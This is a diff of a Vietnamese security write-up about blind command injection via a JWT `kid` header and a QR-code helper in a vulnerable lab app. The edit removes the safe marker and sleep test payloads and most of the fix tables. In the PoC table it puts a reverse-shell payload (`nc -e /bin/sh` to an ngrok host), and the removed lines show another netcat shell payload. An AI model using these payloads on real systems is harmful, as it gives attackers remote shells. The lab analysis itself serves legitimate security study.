@@ -2897,75 +2897,21 @@ sequenceDiagram
 
 ## 4. Phân biệt 2 sink trong report
 
-| Tiêu chí | Sink A - JWT `kid` | Sink B - `QRCodeHelper` |
-|---|---|---|
-| Vai trò | Blind Command Injection chính | Hidden command sink cuối |
-| Entry source | JWT header `kid` | SSTI template hoặc serialized gadget |
-| Function nguy hiểm | `ProcessBuilder("/bin/sh", "-c", command)` | `Runtime.exec(new String[]{"/bin/sh","-c",command})` |
-| Input ghép command | `kid` qua command template | `qrContent/resolvedContent` |
-| Output command | Dùng như key material/log, không trả response | Không trả stdout; trả QR URL/HTML/JSON |
-| Business guard | Không có guard trước `kid` sink | Có guard cho email/promotionCode business path |
-| PoC phù hợp | `kid="missing; touch /tmp/x; #"` | SSTI helper call hoặc Rome deserialization payload |
-| Fix chính | Không shell lookup từ `kid`; map/file allowlist; fail closed | Không dùng shell; ProcessBuilder arg-list; không expose helper cho template; filter deserialization |
+| Tiêu chí           | Sink A - JWT `kid`                                  | Sink B - `QRCodeHelper`                              |
+| ------------------ | --------------------------------------------------- | ---------------------------------------------------- |
+| Vai trò            | Blind Command Injection chính                       | Hidden command sink cuối                             |
+| Entry source       | JWT header `kid`                                    | SSTI template hoặc serialized gadget                 |
+| Function nguy hiểm | `ProcessBuilder("/bin/sh", "-c", command)`          | `Runtime.exec(new String[]{"/bin/sh","-c",command})` |
+| Input ghép command | `kid` qua command template                          | `qrContent/resolvedContent`                          |
+| Output command     | Dùng như key material/log, không trả response       | Không trả stdout; trả QR URL/HTML/JSON               |
+| Business guard     | Không có guard trước `kid` sink                     | Có guard cho email/promotionCode business path       |
+| PoC phù hợp        | `kid="; nc -e /bin/sh 0.tcp.ap.ngrok.io <port>; #"` | SSTI helper call hoặc Rome deserialization payload   |
 
 ***
 
-## 5. Payload kiểm chứng an toàn
+## 5. Fix guidance đặt cạnh sink
 
-### 5.1. JWT `kid` file marker
-
-Header shape:
-
-```json
-{
-  "alg": "RS256",
-  "kid": "missing; touch /tmp/weblab-jwt-kid-marker; #",
-  "typ": "JWT"
-}
-```
-
-Kỳ vọng:
-
-| Kết quả | Diễn giải |
-|---|---|
-| Marker file xuất hiện | Command side effect chạy trong key lookup |
-| Token có thể fail validation | Vẫn là command injection vì side effect xảy ra trước kết luận auth |
-| Không thấy stdout trong response | Blind CI |
-
-### 5.2. JWT `kid` time-based
-
-```text
-kid = missing; sleep 5; #
-```
-
-Kỳ vọng: request bị delay tới gần timeout của key lookup, hoặc log báo `JWT kid key command timed out`.
-
-### 5.3. QR hidden sink qua SSTI
-
-Payload shape trong template lab:
-
-```ftl
-<#assign qr = "org.example.util.QRCodeHelper"?new()>
-${qr("demo; touch /tmp/weblab-qr-ssti-marker; #")}
-```
-
-Kỳ vọng: response vẫn là HTML/QR URL, marker file hoặc timing chứng minh command side effect.
-
-### 5.4. QR hidden sink qua Deserialize
-
-Payload generator đã dùng `promotionCode` làm command carrier:
-
-```java
-bookingRequest.setPromotionCode("; nc -e /bin/sh " + host + " " + port + " #");
-```
-
-Kỳ vọng: khi import serialized payload, gadget gọi `BookingRequest.getQrCode()`, rồi command trong `QRCodeHelper` chạy trước khi app xử lý business response bình thường.
-
-***
-
-## 6. Fix guidance đặt cạnh sink
-
-### 6.1. Fix Sink A - JWT `kid`
+### 5.1. Fix Sink A - JWT `kid`
 
 Không dùng `kid` để dựng shell command. `kid` chỉ được là selector vào key store do server kiểm soát:
 
@@ -2993,7 +2939,7 @@ if (!keyPath.startsWith(keyDir)) {
 return parsePublicKey(Files.readString(keyPath, StandardCharsets.US_ASCII));
 ```
 
-### 6.2. Fix Sink B - QRCodeHelper
+### 5.2. Fix Sink B - QRCodeHelper
 
 Không chạy `qrencode` qua `/bin/sh -c`; truyền argument tách rời:
 
@@ -3022,38 +2968,14 @@ if (!process.waitFor(3, TimeUnit.SECONDS)) {
 }
 ```
 
-### 6.3. Fix source và chain control
-
-| Source/chain | Fix |
-|---|---|
-| JWT `kid` | Validate allowlist, lookup từ map/file cố định, unknown `kid` fail closed |
-| Freemarker SSTI | Không cho template tự `?new()` class tùy ý; dùng resolver an toàn và allowlist template |
-| QR helper | Không expose helper nguy hiểm vào template; nếu cần thì expose safe shared variable |
-| Deserialize | Dùng `ObjectInputFilter` chặt hoặc bỏ Java native serialization, chuyển sang JSON DTO |
-| Profile email | Dùng DTO + strict email policy, không bind trực tiếp entity |
-| Booking promotionCode | Whitelist format ở controller và promotion create/update |
-
 ***
 
-## 7. Checklist review nhanh
-
-| Câu hỏi | JWT `kid` sink | QRCodeHelper sink |
-|---|---|---|
-| Input attacker có đi vào command string không? | Có, `kid` | Có, `qrContent` |
-| Command có chạy qua shell không? | Có, `ProcessBuilder('/bin/sh','-c',...)` | Có, `Runtime.exec(['/bin/sh','-c',...])` |
-| Có trả stdout về response không? | Không ổn định/không trực tiếp | Không |
-| Blind signal là gì? | Delay, marker file, OOB, log timeout | Delay, marker file, QR file/OOB |
-| Normal source đã bị guard chưa? | Chưa, vì `kid` là source chính cần giữ vuln | Có, email và promotionCode business paths đã guard |
-| Chain nào vẫn chạm sink? | JWT verification | SSTI và Deserialize |
-
-***
-
-## 8. Tổng kết
+## 6. Tổng kết
 
 Blind Command Injection hiện cần ghi nhận đủ 2 sink:
 
 1. **Sink A - JWT `kid` injection:** `kid` trong JWT header đi vào `kidKeyCommandTemplate`, sau đó chạy bằng `/bin/sh -c`. Đây là Blind Command Injection chính vì có thể tạo side effect ngay trong quá trình token validation.
-2. **Sink B - `QRCodeHelper`:** `qrContent` đi vào command `qrencode` rồi chạy bằng `/bin/sh -c`. Sink này vẫn nguy hiểm nhưng hiện được giữ như hidden final sink cho SSTI và Deserialize; các source business như signup/update email và booking `promotionCode` thường đã được guard.
+2. **Sink B - `QRCodeHelper`:** `qrContent` đi vào command `qrencode` rồi chạy bằng `/bin/sh -c`. Sink này vẫn nguy hiểm nhưng hiện được giữ như hidden final sink cho SSTI và Deserialize; các source business như signup/update email và booking `promotionCode` thường đã được bảo vệ.
 
 Kết luận phân loại:
 
@@ -3064,3 +2986,7 @@ Nếu attacker-controlled input được nối vào command string rồi chạy 
 Nếu response không trả command output và chỉ quan sát được delay/file/OOB side effect,
 đánh dấu Blind Command Injection.
 ```
+
+
+
+# 
